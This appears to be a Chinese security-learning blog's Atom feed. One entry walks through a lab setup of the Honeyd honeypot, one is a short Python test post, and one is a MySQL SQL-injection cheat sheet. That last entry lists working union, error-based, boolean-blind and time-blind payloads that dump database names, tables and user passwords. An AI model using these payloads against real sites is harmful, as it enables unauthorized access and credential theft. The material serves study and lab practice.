<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Adad456</title>
  
  <subtitle>Learning</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://adad456.github.io/"/>
  <updated>2019-10-17T08:57:22.672Z</updated>
  <id>https://adad456.github.io/</id>
  
  <author>
    <name>Adad456</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>test2</title>
    <link href="https://adad456.github.io/2019/10/17/test2/"/>
    <id>https://adad456.github.io/2019/10/17/test2/</id>
    <published>2019-10-17T08:56:54.000Z</published>
    <updated>2019-10-17T08:57:22.672Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一次实验课：利用honeyd搭建蜜罐"><a href="#一次实验课：利用honeyd搭建蜜罐" class="headerlink" title="一次实验课：利用honeyd搭建蜜罐"></a>一次实验课：利用honeyd搭建蜜罐</h2><h3 id="Honeyd相关依赖的安装"><a href="#Honeyd相关依赖的安装" class="headerlink" title="Honeyd相关依赖的安装"></a>Honeyd相关依赖的安装</h3><h4 id="安装g-gcc（对相关的一些依赖进行源码编译安装）"><a href="#安装g-gcc（对相关的一些依赖进行源码编译安装）" class="headerlink" title="安装g++ gcc（对相关的一些依赖进行源码编译安装）"></a>安装g++ gcc（对相关的一些依赖进行源码编译安装）</h4><p><code>sudo apt-get update &amp;&amp; sudo apt-get install g++ gcc</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542713989.95.png" alt=""></p><h4 id="安装Libevent-非同步事件通知的函数库"><a href="#安装Libevent-非同步事件通知的函数库" class="headerlink" title="安装Libevent(非同步事件通知的函数库)"></a>安装Libevent(非同步事件通知的函数库)</h4><p>通过使用libevent，开发人员可以设定某些事件发生时所执行的函数，可以代替以往程序所使用的循环检查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf libevent-1.4.14b-stable.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714140.4.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714266.65.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714342.43.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714411.04.png" alt=""></p><h4 id="安装Libdnet-提供跨平台的网络相关的API函数库"><a href="#安装Libdnet-提供跨平台的网络相关的API函数库" class="headerlink" title="安装Libdnet(提供跨平台的网络相关的API函数库)"></a>安装Libdnet(提供跨平台的网络相关的API函数库)</h4><p>包括了ARP缓存，路由表查询，IP包及物理帧的传输</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf libdnet-1.11.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714501.68.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542714633.0.png" alt=""></p><h4 id="安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础"><a href="#安装Libpcap-一个数据包捕获函数库，大多数网络软件都以它为基础" class="headerlink" title="安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)"></a>安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf libpcap-1.7.3.tar.gz</span><br><span class="line">sudo tar -zxvf libpcap-1.5.3.tar.gz </span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line">#在Ubuntu下缺少 flex  bison 手动安装</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install bison</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716679.98.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542716838.58.png" alt=""></p><h4 id="安装ARPD（运行在与Honeyd相同的系统上）"><a href="#安装ARPD（运行在与Honeyd相同的系统上）" class="headerlink" title="安装ARPD（运行在与Honeyd相同的系统上）"></a>安装ARPD（运行在与Honeyd相同的系统上）</h4><p>是honeyd众多协作工具中最重要的一个工具。ARPD工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中ARPD会对指定IP地址范围内未使用的IP用honedy的MAC地址做出arp应答。这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机。这样设计可以在内网中最大化的诱导蠕虫病毒，诱导攻击流。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf arpd-0.2.tar.gz </span><br><span class="line">sudo ./configure </span><br><span class="line">#报错：error：expected’)’ before string constant</span><br><span class="line">#解决：在arpd.c文件中添加#define __FUNCTION__</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717043.1.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717136.12.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717261.85.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717343.56.png" alt=""></p><h4 id="安装Honeyd"><a href="#安装Honeyd" class="headerlink" title="安装Honeyd"></a>安装Honeyd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf honeyd-1.5c.tar.gz</span><br><span class="line">sudo ./configure</span><br><span class="line">#报错：configure: error: Couldn&apos;t figure out how to access libc</span><br><span class="line">#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717614.01.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717760.42.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717808.49.png" alt=""></p><h4 id="检测arpd和honeyd是否可以运行"><a href="#检测arpd和honeyd是否可以运行" class="headerlink" title="检测arpd和honeyd是否可以运行"></a>检测arpd和honeyd是否可以运行</h4><h5 id="arpd"><a href="#arpd" class="headerlink" title="arpd"></a>arpd</h5><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717918.17.png" alt=""></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#运行后显示链接不存在</span><br><span class="line">#解决：</span><br><span class="line">whereis  libevent-1.4.so.2</span><br><span class="line">#将libevent-1.4.so.2位置添加到/etc/ld.so.conf</span><br><span class="line">sudo vim /etc/ld.so.conf</span><br><span class="line">#重新加载链接</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718321.01.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718381.8.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718352.41.png" alt=""></p><h5 id="honeyd"><a href="#honeyd" class="headerlink" title="honeyd"></a>honeyd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">honeyd</span><br><span class="line">#报错：无法加载libdnet</span><br><span class="line">#解决：也是无法链接，但是这个缺少链接文件：</span><br><span class="line">whereis libdnet</span><br><span class="line">#生成链接</span><br><span class="line">sudo cp /usr/local/lib/libdnet.1.0.1 /usr/local/lib/libdnet.so.1.0.1</span><br><span class="line">#重新加载</span><br><span class="line">sudo /sbin/ldconfig</span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718573.78.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718977.76.png" alt=""></p><h3 id="简单的调试与测试"><a href="#简单的调试与测试" class="headerlink" title="简单的调试与测试"></a>简单的调试与测试</h3><ul><li><p>arpd侦听ens33网卡上的一个空闲的ip:192.168.1.71  </p><p><code>sudo arpd -i ens33 192.168.1.71</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719524.81.png" alt=""></p></li><li><p>将honeyd下的config.sample改名并配置蜜罐启动的系统及其配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo mv config.sample ./honeyd.conf</span><br><span class="line">sudo vim honeyd.conf</span><br><span class="line"># Example of a simple host template and its binding</span><br><span class="line">create windows</span><br><span class="line">#创建一个windows xp系统的蜜罐</span><br><span class="line">set windows personality &quot;Microsoft Windows XP Professional SP1&quot;</span><br><span class="line">#设置系统重启时间</span><br><span class="line">set windows uptime 1728650</span><br><span class="line">#设置最大文件描述符</span><br><span class="line">set windows maxfds 35</span><br><span class="line">#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.sh</span><br><span class="line">add windows tcp port 80 &quot;sh sh //home/toml/Desktop/honeyd/honeyd-1.5c/scripts/web.sh&quot;</span><br><span class="line">#开启22，23端口</span><br><span class="line">add windows tcp port 22 &quot;sh scripts/test.sh $ipsrc $dport&quot;</span><br><span class="line">add windows tcp port 23 proxy $ipsrc:23</span><br><span class="line">#add template udp port 53 proxy 141.211.92.141:53</span><br><span class="line">#关闭默认的tcp,udp连接</span><br><span class="line">set windows default tcp action reset</span><br><span class="line">set windows default udp action reset</span><br><span class="line">#开启135，139端口</span><br><span class="line">add windows tcp port 135 open</span><br><span class="line">add windows tcp port 139 open</span><br><span class="line"></span><br><span class="line">bind 192.168.1.71 windows</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719973.36.png" alt=""></p></li><li><p>启动honeyd </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo honeyd -d -f honeyd.conf  -p nmap.prints -x xprobe2.conf -a nmap.assoc -i ens33 192.168.1.71</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720601.46.png" alt=""></p></li><li><p>在同网段下ping，访问web服务</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720665.52.png" alt="">)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720690.71.png" alt=""></p></li><li><p>蜜罐的监听显示如下（分别是本机ping蜜罐机192.168.1.71的ping包和本机访问蜜罐主机的80端口建立连接的过程）</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720889.75.png" alt=""></p></li><li><p>蜜罐主机应用的web服务显示的脚本内容</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542721041.24.png" alt=""></p></li></ul><h3 id="实验思考题"><a href="#实验思考题" class="headerlink" title="实验思考题"></a>实验思考题</h3><p>如何利用Honeyd实现跨网段的模拟。</p><p>回答：</p><ol><li>可以利用wmware自带的NAT模式实现路由转发的功能，达到跨网段访问的目的。</li><li>可以通过自己手动配置路由表，添加路由规则实现跨网段访问的目的。</li></ol><h3 id="实验中的问题"><a href="#实验中的问题" class="headerlink" title="实验中的问题"></a>实验中的问题</h3><ol><li>对于Libpcap的安装：在Debian下1.7.3版本太高，会出现头文件的报错，使用1.5.3版本，Ubuntu系统无影响；在Ubuntu下缺少 flex  bison ，需要手动安装。</li><li>安装完所有的依赖及honeyd后需要配置arpd和honeyd链接的问题，不然无法运行。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）" target="_blank" rel="noopener">https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）</a></p><p><a href="https://blog.csdn.net/accepthjp/article/details/46399715" target="_blank" rel="noopener">https://blog.csdn.net/accepthjp/article/details/46399715</a></p><p><a href="https://blog.csdn.net/LFGxiaogang/article/details/73287152" target="_blank" rel="noopener">https://blog.csdn.net/LFGxiaogang/article/details/73287152</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一次实验课：利用honeyd搭建蜜罐&quot;&gt;&lt;a href=&quot;#一次实验课：利用honeyd搭建蜜罐&quot; class=&quot;headerlink&quot; title=&quot;一次实验课：利用honeyd搭建蜜罐&quot;&gt;&lt;/a&gt;一次实验课：利用honeyd搭建蜜罐&lt;/h2&gt;&lt;h3 id=&quot;H
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://adad456.github.io/2019/10/17/test/"/>
    <id>https://adad456.github.io/2019/10/17/test/</id>
    <published>2019-10-17T08:53:54.000Z</published>
    <updated>2019-10-17T08:55:27.015Z</updated>
    
    <content type="html"><![CDATA[<h3 id="测试一"><a href="#测试一" class="headerlink" title="测试一"></a>测试一</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">print(sys.argv[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><h3 id="测试二"><a href="#测试二" class="headerlink" title="测试二"></a>测试二</h3><h3 id="测试三"><a href="#测试三" class="headerlink" title="测试三"></a>测试三</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;测试一&quot;&gt;&lt;a href=&quot;#测试一&quot; class=&quot;headerlink&quot; title=&quot;测试一&quot;&gt;&lt;/a&gt;测试一&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="test" scheme="https://adad456.github.io/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>获取数据库信息</title>
    <link href="https://adad456.github.io/2019/10/17/%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF/"/>
    <id>https://adad456.github.io/2019/10/17/获取数据库信息/</id>
    <published>2019-10-17T08:44:05.000Z</published>
    <updated>2019-10-17T08:52:19.995Z</updated>
    
    <content type="html"><![CDATA[<p><strong>mysql数据库常用函数:</strong></p><pre><code>system_user()系统用户名users()用户名current_user()当前用户名session_user()连接数据库的用户名database() 数据库名version() MYSQL数据库版本@@datadir 读取数据库路径@@basedir MYSQL安装路径@@version_compile_os 操作系统concat(str1,str2,str3),返回str1+str2+str3;当有一个字符串为NULL时，即返回NULLconcat_ws(separator,str1,str2,str3),返回str1+separator+str2+separator+str3group_concat（str1,str2,str3）,返回str1+str2+str3;ascii(a)将a转换成其ASCII值ord(a)将a转换成其ASCII值left(a,b)从左往右截取字符串a的前b个字符substr(a,b,c)从b位置开始，截取字符串a的c长度mid(a,b,c)从位置b开始，截取a字符串的c位regexp、like语句</code></pre><h1 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h1><p><strong>union用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1</strong></p><p><em>查询当前数据库：</em></p><pre><code>id=-1&apos; and union select 1,2,database()--+</code></pre><p><em>查询所有数据库：</em></p><pre><code>id=-1&apos; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p><pre><code>id=-1&apos; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></pre><p><em>查询列名：</em></p><pre><code>id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; --+</code></pre><p><em>查询字段值：</em></p><pre><code>id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+</code></pre><p>#基于报错注入</p><p>##updatexml报错注入</p><p><strong>updatexml(XML_document,XPath_String,new_value)</strong></p><p><em>获取数据库名、版本信息：</em></p><pre><code>id=1&apos; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+</code></pre><p><em>获取表名：</em></p><pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+</code></pre><p><em>获取列名：</em></p><pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x23),1)--+</code></pre><p><em>获取表users()中的用户名和密码：</em></p><pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p>##floor报错注入</p><p><strong>floor(rand(0)*2)</strong></p><p><em>爆库：</em></p><pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y)--+爆库或：id=1&apos; union select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y--+或：id=1&apos; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+</code></pre><p><em>爆表：</em></p><pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+</code></pre><p><em>爆列名：</em></p><pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><em>爆字段值:</em></p><pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p>##extractvalue报错注入</p><p><strong>extractvalue(xml_frag, xpath_expr)</strong></p><p><em>爆库：</em></p><pre><code>id=1&apos; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><em>爆表：</em></p><pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><em>爆列名:</em></p><pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)))--+</code></pre><p><em>爆字段：</em></p><pre><code>id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+</code></pre><p>#盲注</p><p>##基于布尔的盲注</p><pre><code>ascii()返回指定字符串最左侧字符的ascii值count()计算结果集的数量length()返回指定字符串的长度substr(str,pos,len)substring(str,pos,len)返回截取的子字符串</code></pre><p><em>判断数据库名的长度</em></p><pre><code>id=1&apos; and (length(database())&gt;9) --+id=1&apos; and (length(database())=9) --+id=-1&apos; and (length(database())&gt;0) --+</code></pre><p><em>猜数据库名</em></p><pre><code>id=1&apos; and (left(database(),1)=&apos;s&apos;)--+从左到右截取一个字符,s对应的ascii值为115id=1&apos; and ascii(substr(database(),1,1))=115 --+id=1&apos; and ascii(substr(database(),1,1))&lt;115 --+可以使用‘&lt;’，‘&gt;’来判断id=1&apos; and (left(database(),2)=&apos;se&apos;)--+从左到右截取两个字符</code></pre><p><em>猜当前数据库中表的数量</em></p><pre><code>id=1&apos; and 4=(select count(table_name) from information_schema.tables where table_schema=database())--+id=1&apos; and 4=(select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)--+</code></pre><p><em>猜当前数据库中表名的长度</em></p><pre><code>id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),7,1))--+表名的长度即是7-1=6位，这里的limit是取的第一个数据库id=1&apos; and (length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)=6))--+id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),7,1))--+ 这里的limit是取的第二个数据库id=1&apos; and (length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1)=8))--+</code></pre><p><em>逐个猜解表名</em></p><pre><code>格式为：ascii(substr(xxx limit null,1),null,1) ,对递增依次猜解id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+对数据库中的第一个表的第一个字符进行ascii的猜解id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+对数据库中的第一个表的第二个字符进行ascii的猜解</code></pre><p><em>猜表中列的数量</em></p><pre><code>id=1&apos; and (select count(column_name) from information_schema.columns where table_name=&apos;users&apos;)=20 --+</code></pre><p><em>猜列名的长度</em></p><pre><code>id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),2,1)) --+id=1&apos; and length((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1))=2 --+</code></pre><p><em>猜解列名</em></p><pre><code>id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105 --+</code></pre><p><em>猜字段数量</em></p><pre><code>id=1&apos; and (select count(username) from security.users)=13 --+</code></pre><p><em>猜字段长度</em></p><pre><code>id=1&apos; and length((select username from security.users limit 0,1))=4 --+</code></pre><p><em>dump字段的值</em></p><pre><code>id=1&apos; and ascii(substr((select username from security.users limit 0,1),1,1))=67--+id=1&apos; and ascii(substr((select concat(username,&apos;:&apos;,password) from security.users limit 0,1),1,1))=68--+</code></pre><p>##基于时间的盲注</p><p><em>在获取表名、列名以及具体信息时，方法与布尔盲注相同，都是逐个猜解</em></p><pre><code>if(1,2,3)：如果1为True，则执行2，否则执行3sleep(x)：执行延迟x秒ascii(char)：将char转换为对应的ascii码substr(string,start,len)：从string的start位开始截取len个字符Benchmark(x,1)：执行表达式1，x次（会消耗CPU，慎用）</code></pre><p><em>查看信息</em></p><pre><code>id=1&apos; and if(ascii(substr(user(),1,1))=114,sleep(3),1)查看用户名id=1&apos; and if(ascii(substr(database(),1,1))=114,sleep(3),1)查看数据库id=1&apos; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版本</code></pre><p><em>爆表名</em></p><pre><code>id=-1&apos; and union select if(ascii(substr(table_name,1,1))&gt;97,sleep(5),1),2,3 from information_schema.tables where table_schema = database() limit 0,1</code></pre><p><em>爆列名</em></p><pre><code>id=-1&apos; and union select if(ascii(substr(column_name,1,1))=105,sleep(5),1),2,3 from information_schema.columns where table_name = &apos;admin&apos; limit 0,1</code></pre><p><em>爆数据</em></p><pre><code>id=-1&apos; and union select if(ascii(substr(user,1,1))=97,sleep(5),1),2,3 from admin limit 0,1</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;mysql数据库常用函数:&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;system_user()系统用户名

users()用户名

current_user()当前用户名

session_user()连接数据库的用户名

database() 数据
      
    
    </summary>
    
    
      <category term="web安全 - SQL注入" scheme="https://adad456.github.io/categories/web%E5%AE%89%E5%85%A8-SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="数据库" scheme="https://adad456.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
</feed>
